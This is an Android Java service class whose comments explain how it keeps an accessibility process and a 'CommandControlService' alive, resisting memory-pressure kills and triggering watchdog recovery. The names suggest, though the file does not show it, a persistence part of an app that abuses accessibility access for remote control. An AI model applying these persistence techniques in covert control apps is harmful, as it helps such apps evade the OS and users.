package com.seguranca.protecao;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.util.Log;

/**
 * AccessibilityIpcService — lightweight companion running in the :accessibility process.
 *
 * CommandControlService (main process) binds to this with BIND_AUTO_CREATE | BIND_IMPORTANT.
 *
 * What this achieves:
 *   1. OOM elevation — the binding causes Android to elevate the main process's
 *      oom_score_adj to match the :accessibility process which the system keeps
 *      at near-foreground priority. Both processes become immune to memory-pressure
 *      kills simultaneously.
 *
 *   2. Cross-process death notification — ServiceConnection.onServiceDisconnected()
 *      fires in CCS the moment the :accessibility process dies, giving CCS an
 *      immediate signal to trigger AccessibilityWatchdog recovery instead of
 *      waiting for the next alarm or ContentObserver change.
 *
 *   3. Keeps the :accessibility process alive even when UiAssistBridge has no
 *      active events — Android won't kill a process with an active bound client.
 *
 * This service does nothing beyond holding the binder open. All real logic stays
 * in UiAssistBridge and AccessibilityWatchdog.
 */
public final class AccessibilityIpcService extends Service {

    private static final String TAG = "AccessibilityIpcService";
    private final IBinder binder = new Binder();

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, ":accessibility process IPC service created");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
}
